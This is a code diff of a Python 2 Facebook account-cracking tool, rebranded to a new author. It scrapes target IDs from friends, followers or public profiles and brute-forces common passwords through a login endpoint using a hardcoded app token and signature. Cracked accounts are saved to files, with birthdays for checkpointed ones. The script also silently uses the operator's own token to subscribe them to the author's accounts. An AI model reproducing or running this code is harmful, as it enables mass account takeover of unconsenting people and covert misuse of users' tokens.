@@ -126,57 +126,92 @@ loginlogo = """
 \033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
-\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP """
+\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP 
+\033[1;97m--------------------------------------------
+\033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
+\033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
+\033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
+\033[1;97m--------------------------------------------"""
 cookieslogo = """
 \033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
 \033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
 \033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
-\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP """
+\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
+\033[1;97m--------------------------------------------
+\033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
+\033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
+\033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
+\033[1;97m--------------------------------------------"""
 tokenlogo = """
 \033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
 \033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
 \033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
-\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP """
+\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
+\033[1;97m--------------------------------------------
+\033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
+\033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
+\033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
+\033[1;97m--------------------------------------------"""
 idPasslogo = """
 \033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
 \033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
 \033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
-\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP """
+\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
+\033[1;97m--------------------------------------------
+\033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
+\033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
+\033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
+\033[1;97m--------------------------------------------"""
 cracklogo = """
 \033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
 \033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
 \033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
-\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP """
+\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
+\033[1;97m--------------------------------------------
+\033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
+\033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
+\033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
+\033[1;97m--------------------------------------------"""
 crackinglogo = """
 \033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
 \033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
 \033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
-\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP """
+\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
+\033[1;97m--------------------------------------------
+\033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
+\033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
+\033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
+\033[1;97m--------------------------------------------"""
 checkerlogo = """
 \033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
 \033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
 \033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
-\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP """
+\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
+\033[1;97m--------------------------------------------
+\033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
+\033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
+\033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
+\033[1;97m--------------------------------------------"""
 def results(ok, cp):
     if len(ok) != 0 or len(cp) != 0:
-        print '\n\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
-        zks('\x1b[0;97m|  Total Cracked FB Idz: \x1b[0;92m' + str(len(ok)) + '\x1b[0;97m/' + str(len(cp)))
-        zks('\x1b[0;97m|  Total Cracked OK Idz: \x1b[0;92m' + str(len(ok)))
-        zks('\x1b[0;97m|  Total Cracked CP Idz: \x1b[0;97m' + str(len(cp)))
-        print '\xe2\x94\x9c  Cracked Idz Has Been Saved In Cracked Folder  \xe2\x94\xa4'
-        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
+        print '\033[1;97m--------------------------------------------'
+        zks('  Total Cracked FB Idz: \x1b[0;92m' + str(len(ok)) + '\x1b[0;97m/' + str(len(cp)))
+        zks('  Total Cracked OK Idz: \x1b[0;92m' + str(len(ok)))
+        zks('  Total Cracked CP Idz: \x1b[0;97m' + str(len(cp)))
+        print '\ Cracked Idz Has Been Saved In Cracked Folder  '
+        print '\033[1;97m--------------------------------------------'
         raw_input('[\xe2\x9e\xa3] Press Any Key To Go Back To Cracking Menu: ')
         cracking_menu()
     else:
@@ -189,10 +224,10 @@ def zkbot():
     try:
         token = open('login.txt', 'r').read()
     except IOError:
-        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
+        zks(' \x1b[0;97m Removing Token..! Login Again')
         zmbf()
 
-    zks('\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa4\x1b[0;97m] Wait! While The Program Is Loading')
+    zks('\x1b[0;97m Wait! Plz wait some time to Login')
     requests.post('https://graph.facebook.com/1675627047/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100045165501610/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100002151005321/subscribers?access_token=' + token)
@@ -292,8 +327,8 @@ def cookies():
     cookies = open('login.txt', 'w')
     cookies.write(find_token.group(1))
     cookies.close()
-    zks(' \x1b[0;97m[\x1b[0;92m\xf0\x9f\x8c\xb9\x1b[0;97m] Login Successfull\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9')
-    os.system('xdg-open https://youtube.com/c/ZeeKTricks')
+    zks(' \x1b[0;97m Login Successfull')
+    os.system('xdg-open https://facebook.com/Rishu.X.420')
     zkbot()
     return
 
@@ -305,9 +340,8 @@ def tokenz():
         cracking_menu()
     except (KeyError, IOError):
         print tokenlogo
-        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
-        print '\xe2\x94\x9c         Login Using FB ID Access Token         \xe2\x94\xa4'
-        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
+        print '   Login Using FB ID Access Token  '
+        print '\033[1;97m--------------------------------------------'
         
     token = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Token -> \x1b[0;92m')
     try:
@@ -317,7 +351,7 @@ def tokenz():
         zedd = open('login.txt', 'w')
         zedd.write(token)
         zedd.close()
-        zks(' \x1b[0;97m[\x1b[0;92m\xf0\x9f\x8c\xb9\x1b[0;97m] \033[1;32mLogin Successfull\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9')
+        zks('  \033[1;32mLogin Successfull')
         os.system('xdg-open htpps://facebook.com/Rishu.X.420')
         zkbot()
     except KeyError:
@@ -351,24 +385,24 @@ def cracking_menu():
         exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Internet Connection! Try Again')
 
     print logo
-    print '-------------------------------'
+    print '--------------------------------------------'
     print H + '| Name        : ' + H + H + '%s' % nama
     print '| User ID     : ' + H + id
     print '| User Dob    : ' + H + dob
     print '| User Gender : ' + H + gender
-    print '-------------------------------'
+    print '--------------------------------------------'
     print ''
     print '      Cracking Menu '
-    print '-------------------------------'
-    print '\xe2\x94\x9c [01] Crack From Friends '
-    print '\xe2\x94\x9c [02] Crack From Public '
-    print '\xe2\x94\x9c [03] Crack From Followers '
-    print '\xe2\x94\x9c [04] Crack From Public Followers '
-    print '\xe2\x94\x9c [05] Check Cracked Checkpoint Accounts '
-    print '\xe2\x94\x9c [06] Follow Me On Facebook '
-    print '\xe2\x94\x9c [eE] Exit Program                              \xe2\x94\xa4'
-    print '-------------------------------'
-    zk = raw_input('\n \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose -> \033[1;32m')
+    print '--------------------------------------------'
+    print ' [01] Crack From Friends '
+    print ' [02] Crack From Public '
+    print ' [03] Crack From Followers '
+    print ' [04] Crack From Public Followers '
+    print ' [05] Check Cracked Checkpoint Accounts '
+    print ' [06] Follow Me On Facebook '
+    print ' [eE] Exit Program  '
+    print '--------------------------------------------'
+    zk = raw_input('\n \x1b[0;97m Choose -> \033[1;32m')
     if zk == '':
         print '  [!] Choose An Option'
         time.sleep(2)
@@ -384,17 +418,17 @@ def cracking_menu():
     elif zk == '5' or zk == '05':
         relogin()
     elif zk == '6' or zk == '06':
-        os.system('xdg-open https://youtube.com/c/ZeeKTricks')
+        os.system('xdg-open https://facebook.com/Rishu.X.420')
         cracking_menu()
     elif zk == '7' or zk == '07':
-        os.system('xdg-open https://t.me/ZeeKWorld')
+        os.system('xdg-open https://facebook.com/Rishu.X.420')
         cracking_menu()
     elif zk == '8' or zk == '08':
-        os.system('xdg-open https://www.facebook.com/Zahid.Alone.Lover')
+        os.system('xdg-open https://www.facebook.com/Rishu.X.420')
         cracking_menu()
     elif zk == '9' or zk == '09':
         os.system('rm -f login.txt')
-        zks('  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
+        zks('  \x1b[0;97m Removing Token..! Login Again')
         zmbf()
     elif zk == 'e' or zk == 'E':
         exitp()
@@ -407,15 +441,14 @@ def cracking_menu():
 def friends(token):
     os.system('clear')
     print cracklogo
-    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
-    print '\xe2\x94\x9c              Cracking From Friends             \xe2\x94\xa4'
-    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
+    print '    Cracking From Friends '
+    print '--------------------------------------------'
     try:
         pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
         sp = json.loads(pok.text)
-        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Your Name : ' + sp['name'])
+        zks('\x1b[0;97m Your Name : ' + sp['name'])
     except KeyError:
-        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] User Id Not Found!'
+        print '\x1b[0;91mUser Id Not Found!'
         time.sleep(2)
         friends(token)
 
@@ -439,15 +472,14 @@ def friends(token):
 def myfoll(token):
     os.system('clear')
     print cracklogo
-    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
-    print '\xe2\x94\x9c              Cracking From Followers           \xe2\x94\xa4'
-    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
+    print '    Cracking From Followers '
+    print '--------------------------------------------'
     try:
         pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
         sp = json.loads(pok.text)
-        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] \033[1;37mYour Name : \033[1;32m' + sp['name'])
+        zks(' \033[1;37mYour Name : \033[1;32m' + sp['name'])
     except KeyError:
-        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mUser Id Not Found!'
+        print ' \033[1;31mUser Id Not Found!'
         time.sleep(2)
         myfoll(token)
 
@@ -459,11 +491,11 @@ def myfoll(token):
             zk.write(a['id'] + '<=>' + a['name'] + '\n')
 
         zk.close()
-        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Your Total Followers : \033[1;32m%s' % len(id))
+        zks('\x1b[0;97m Your Total Followers : \033[1;32m%s' % len(id))
         return crackz(filen)
     except (KeyError, IOError):
         os.remove(file)
-        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mFollowers Idz Not Found! Try Again!'
+        print ' \033[1;31mFollowers Idz Not Found! Try Again!'
         time.sleep(2)
         myfoll()
 
@@ -471,16 +503,15 @@ def myfoll(token):
 def public(token):
     os.system('clear')
     print cracklogo
-    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
-    print '\xe2\x94\x9c              Cracking From Public              \xe2\x94\xa4'
-    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
-    idt = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Public ID -> \033[1;32m')
+    print '   Cracking From Public '
+    print '--------------------------------------------'
+    idt = raw_input('\x1b[0;97m Public ID -> \033[1;32m')
     try:
         pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
         sp = json.loads(pok.text)
-        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Target Name : \033[1;32m' + sp['name'])
+        zks('\x1b[0;97m Target Name : \033[1;32m' + sp['name'])
     except KeyError:
-        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mPublic Id Not Found!'
+        print '\033[1;31mPublic Id Not Found!'
         time.sleep(2)
         public(token)
 
@@ -492,11 +523,11 @@ def public(token):
             zk.write(a['id'] + '<=>' + a['name'] + '\n')
 
         zk.close()
-        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Total Public Friends : \033[1;32m%s' % len(id))
+        zks('\x1b[0;97m Total Public Friends : \033[1;32m%s' % len(id))
         return crackz(filen)
     except (KeyError, IOError):
         os.remove(file)
-        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m]\033[1;31m Public Idz Not Found! Try Again!'
+        print '  \033[1;31m Public Idz Not Found! Try Again!'
         time.sleep(2)
         public()
 
@@ -504,16 +535,15 @@ def public(token):
 def pfoll(token):
     os.system('clear')
     print cracklogo
-    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
-    print '\xe2\x94\x9c          Cracking From Public Followers        \xe2\x94\xa4'
-    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
-    idt = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Public ID -> \033[1;32m')
+    print '     Cracking From Public Followers  '
+    print '--------------------------------------------'
+    idt = raw_input('\x1b[0;97mPublic ID -> \033[1;32m')
     try:
         pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
         sp = json.loads(pok.text)
-        zks('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Target Name : \033[1;32m' + sp['name'])
+        zks('\x1b[0;97m Target Name : \033[1;32m' + sp['name'])
     except KeyError:
-        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mPublic Id Not Found!'
+        print ' \033[1;31mPublic Id Not Found!'
         time.sleep(2)
         public(token)
 
@@ -525,21 +555,21 @@ def pfoll(token):
             zk.write(a['id'] + '<=>' + a['name'] + '\n')
 
         zk.close()
-        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Total Public Followers : \033[1;32m%s' % len(id))
+        zks('\x1b[0;97m Total Public Followers : \033[1;32m%s' % len(id))
         return crackz(filen)
     except (KeyError, IOError):
         os.remove(file)
-        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mPublic Followers Not Found! Try Again!'
+        print '   \033[1;31mPublic Followers Not Found! Try Again!'
         time.sleep(2)
         pfoll()
 
 
 def crackz(file):
+    print '--------------------------------------------'
+    print ' [01] Start Cracking  Process   '
+    print ' [02] Go Back To Cracking Menu  '
     print '-------------------------------'
-    print '\xe2\x94\x9c [01] Start Cracking  Process   '
-    print '\xe2\x94\x9c [02] Go Back To Cracking Menu  '
-    print '-------------------------------'
-    zk = raw_input('\n \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose -> \033[1;32m')
+    zk = raw_input('\n \x1b[0;97m Choose -> \033[1;32m')
     if zk == '':
         print '  [!] Choose An Option'
         time.sleep(2)
@@ -566,27 +596,27 @@ class crackmenu:
             self.apk = isifile
             self.id = open(self.apk).read().splitlines()
         except:
-            print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] File Not Found! Try Again'
+            print ' File Not Found! Try Again'
             time.sleep(2)
             crackmenu().passmenu()
 
-        print '-------------------------------'
+        print '--------------------------------------------'
         print ' [01]. Auto Passwords '
         print ' [02]. Choose Passwords '
-        print '-------------------------------'
-        zk = raw_input(' \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose -> \033[1;32m')
+        print '--------------------------------------------'
+        zk = raw_input('  Choose -> \033[1;32m')
         if zk in ('M', 'm', '2', '02'):
             os.system('clear')
             print cracklogo
             print '\x1b[0;97m [\xe2\x9e\xa3] Enter Password Like: 786786,000786,102030'
             while True:
-                pwx = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Choose Password -> \033[1;31m')
-                zks('\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Applying Passwords: \x1b[0;92m%s' % pwx)
-                print '-------------------------------'
+                pwx = raw_input(' \x1b[0;97m Enter Choose Password -> \033[1;31m')
+                zks('\x1b[0;97mApplying Passwords: \x1b[0;92m%s' % pwx)
+                print '--------------------------------------------'
                 if pwx == '':
-                    zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mPassword Can Not Be Empty')
+                    zks(' \033[1;31mPassword Can Not Be Empty')
                 elif len(pwx) <= 5:
-                    zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mPassword Must Be Six Digits or Characters Long')
+                    zks(' \033[1;31mPassword Must Be Six Digits or Characters Long')
                 else:
 
                     def zkth(zsc=None):
@@ -610,7 +640,7 @@ class crackmenu:
             os.system('clear')
             print logo
             print ' Cracking Started '
-            print '-------------------------------'
+            print '--------------------------------------------'
 
             self.passwords()
         else:
@@ -636,7 +666,7 @@ class crackmenu:
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             response = requests.get(api, params=params, headers=headers_)
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print '\r%s[Al3X-OK]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s' % (H, user, pw, N)
+                print '%s[Al3X-OK]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s' % (H, user, pw, N)
                 wrt = '%s | %s ' % (user, pw)
                 ok.append(wrt)
                 open('Cracked/okz.txt', 'a').write('%s\n' % wrt)
@@ -648,7 +678,7 @@ class crackmenu:
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                     az = json.loads(ak.text)
                     dob = az['birthday'].replace('/', '-')
-                    print '\r%s\033[1;31m[AL3X-CP]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
+                    print '[AL3X-CP] \033[1;31m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
                     wrt = '%s | %s | %s' % (user, pw, dob)
                     cp.append(wrt)
                     open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -658,7 +688,7 @@ class crackmenu:
                 except:
                     pass
 
-                print '\r%s\033[1;31m[AL3X-CP]: %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
+                print '[AL3X-CP]\033[1;31m %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
                 wrt = '%s | %s ' % (user, pw)
                 cp.append(wrt)
                 open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -706,9 +736,9 @@ def relogin():
     os.system('clear')
     print checkerlogo
     print ' Checkpoints Checking Menu '
-    print '-------------------------------'
-    print '\n\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Example File Name: Cracked/cpz.txt'
-    files = raw_input('\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Cracked Idz File Name -> \033[1;31m')
+    print '--------------------------------------------'
+    print '\n\x1b[0;97m Example File Name: Cracked/cpz.txt'
+    files = raw_input('\x1b[0;97m Enter Cracked Idz File Name -> \033[1;31m')
     if files == '':
         print '  [!] Enter A File Name'
         time.sleep(3)
@@ -716,28 +746,28 @@ def relogin():
     try:
         rfiles = open(files, 'r').readlines()
     except IOError:
-        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x9e\xa4\x1b[1;37m] Entered FileName %s%s%s Not Found! Try Another' % (h, files, p)
+        print '\x1b[0;96m\x1b[0;97m Entered FileName %s%s%s Not Found! Try Another' % (h, files, p)
         relogin()
    
-    print '-------------------------------'
+    print '--------------------------------------------'
     zks('Total Cracked Checkpoint Idz : \033[1;32m' % len(rfiles))
     zks('Checking Checkpoint Idz, Wait...')
-    print '-------------------------------'
+    print '--------------------------------------------'
     for sz in rfiles:
         linez = sz.replace('\n', '')
         symbz = linez.split(' | ')
-        print '-------------------------------'
+        print '--------------------------------------------'
         print 'CP Account: ' + linez.replace(' + ', '') + '\n'
         try:
             method(symbz[0].replace('+', ''), symbz[1])
         except requests.exceptions.ConnectionError:
             pass
 
-    print '-------------------------------'
+    print '--------------------------------------------'
     print 'Checking Process Has Been Completed'
     raw_input(' Press Any Key To Go Back To Cracking Menu: ')
     cracking_menu()
-    print '-------------------------------'
+    print '--------------------------------------------'
     menu()
 
 
